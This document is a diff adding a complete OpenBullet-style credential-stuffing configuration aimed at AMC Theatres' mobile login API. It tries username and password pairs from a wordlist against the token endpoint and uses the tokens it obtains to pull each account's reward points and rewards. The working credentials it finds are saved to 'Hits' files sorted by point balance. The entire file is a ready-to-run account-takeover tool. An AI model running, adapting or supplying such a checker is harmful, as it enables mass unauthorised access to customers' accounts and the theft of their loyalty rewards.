@@ -1,0 +1,189 @@
+[SETTINGS]
+{
+  "Name": "AMC THEATERS",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-27T16:09:42.3696461-04:00",
+  "AdditionalInfo": "",
+  "Author": "Aaron Kong | Privileged Owner#1680",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Uppercase",
+      "Id": 1302380256
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 1411046548
+    }
+  ],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION URLEncode "<USER>" -> VAR "USERU" 
+
+FUNCTION RandomString "30c22553-?d?d?d?d-?d?d?dd-be8b-d9d?d?df233033" -> VAR "1" 
+
+FUNCTION Constant "3e1e6b58-b0ce-?dac?d-?d?d?df-a?d?d?d?d?d?de5b?d6" -> VAR "2" 
+
+FUNCTION Constant "b?d?df?dc16-d563-4fa8-?dd?d?d-?dde?dbfa?d?de?d?d" -> VAR "3" 
+
+#MAIN_LOGIN REQUEST POST "https://deviceapi.amctheatres.com/api/token-v2" 
+  CONTENT "grant_type=password&username=<USERU>&password=<PASS>&client_id=A9EEBB05-2E8F-4129-A1A3-9D2DE8BAFD8C" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "X-AMC-Session-Id: <1>" 
+  HEADER "X-AMC-Transaction-Id: <2>" 
+  HEADER "X-AMC-Request-Id: <3>" 
+  HEADER "User-Agent: mobile-app" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: identity" 
+  HEADER "Content-Length: 130" 
+  HEADER "Host: deviceapi.amctheatres.com" 
+  HEADER "Connection: Keep-Alive" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "error\":\"canceled" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "TOKITOKI" 
+
+REQUEST GET "https://deviceapi.amctheatres.com/api/account/reward-summary" 
+  
+  HEADER "Authorization: Bearer <TOKITOKI>" 
+  HEADER "api-version: 1" 
+  HEADER "X-AMC-Session-Id: <1>" 
+  HEADER "X-AMC-Transaction-Id: <2>" 
+  HEADER "X-AMC-Request-Id: <3>" 
+  HEADER "User-Agent: mobile-app" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: identity" 
+  HEADER "Host: deviceapi.amctheatres.com" 
+  HEADER "Connection: Keep-Alive" 
+
+PARSE "<SOURCE>" JSON "pointBalance" CreateEmpty=FALSE -> CAP "Points" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "pointBalance\":0" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "pointBalance\":0" 
+
+PARSE "<SOURCE>" JSON "" Recursive=TRUE -> VAR "R" 
+
+PARSE "<R>" JSON "amount" Recursive=TRUE CreateEmpty=FALSE -> CAP "RewardAmount" 
+
+PARSE "<R>" JSON "description" Recursive=TRUE CreateEmpty=FALSE -> CAP "RewardName" 
+
+IF "<Points>" GreaterThan "1" 
+IF "<Points>" LessThan "9999"
+
+UTILITY File "Hits\\AMC\\1-10k.txt" AppendLines "<USER>:<PASS> Points : <Points> | Rewards : <RewardAmount> | Reward Name : <RewardName>" 
+
+ENDIF
+IF "<Points>" GreaterThan "9999" 
+IF "<Points>" LessThan "19999"
+
+UTILITY File "Hits\\AMC\\10k-20k.txt" AppendLines "<USER>:<PASS> Points : <Points> | Rewards : <RewardAmount> | Reward Name : <RewardName>" 
+
+ENDIF
+IF "<Points>" GreaterThan "19999" 
+IF "<Points>" LessThan "29999"
+
+UTILITY File "Hits\\AMC\\20k-30k.txt" AppendLines "<USER>:<PASS> Points : <Points> | Rewards : <RewardAmount> | Reward Name : <RewardName>" 
+
+ENDIF
+IF "<Points>" GreaterThan "29999" 
+IF "<Points>" LessThan "39999"
+
+UTILITY File "Hits\\AMC\\30k-40k.txt" AppendLines "<USER>:<PASS> Points : <Points> | Rewards : <RewardAmount> | Reward Name : <RewardName>" 
+
+ENDIF
+IF "<Points>" GreaterThan "39999" 
+IF "<Points>" LessThan "49999"
+
+UTILITY File "Hits\\AMC\\40k-50k.txt" AppendLines "<USER>:<PASS> Points : <Points> | Rewards : <RewardAmount> | Reward Name : <RewardName>" 
+
+ENDIF
+IF "<Points>" GreaterThan "49999" 
+IF "<Points>" LessThan "59999"
+
+UTILITY File "Hits\\AMC\\50k-60k.txt" AppendLines "<USER>:<PASS> Points : <Points> | Rewards : <RewardAmount> | Reward Name : <RewardName>" 
+
+ENDIF
+IF "<Points>" GreaterThan "59999" 
+IF "<Points>" LessThan "69999"
+
+UTILITY File "Hits\\AMC\\60k-70k.txt" AppendLines "<USER>:<PASS> Points : <Points> | Rewards : <RewardAmount> | Reward Name : <RewardName>" 
+
+ENDIF
+IF "<Points>" GreaterThan "69999" 
+IF "<Points>" LessThan "79999"
+
+UTILITY File "Hits\\AMC\\70k-80k.txt" AppendLines "<USER>:<PASS> Points : <Points> | Rewards : <RewardAmount> | Reward Name : <RewardName>" 
+
+ENDIF
+IF "<Points>" GreaterThan "79999" 
+IF "<Points>" LessThan "89999"
+
+UTILITY File "Hits\\AMC\\80k-90k.txt" AppendLines "<USER>:<PASS> Points : <Points> | Rewards : <RewardAmount> | Reward Name : <RewardName>" 
+
+ENDIF
+IF "<Points>" GreaterThan "89999" 
+IF "<Points>" LessThan "99999"
+
+UTILITY File "Hits\\AMC\\90k-100k.txt" AppendLines "<USER>:<PASS> Points : <Points> | Rewards : <RewardAmount> | Reward Name : <RewardName>" 
+
+ENDIF
+IF "<Points>" GreaterThan "99999" 
+IF "<Points>" LessThan "999999"
+
+UTILITY File "Hits\\AMC\\Others.txt" AppendLines "<USER>:<PASS> Points : <Points> | Rewards : <RewardAmount> | Reward Name : <RewardName>" 
+
+ENDIF
+
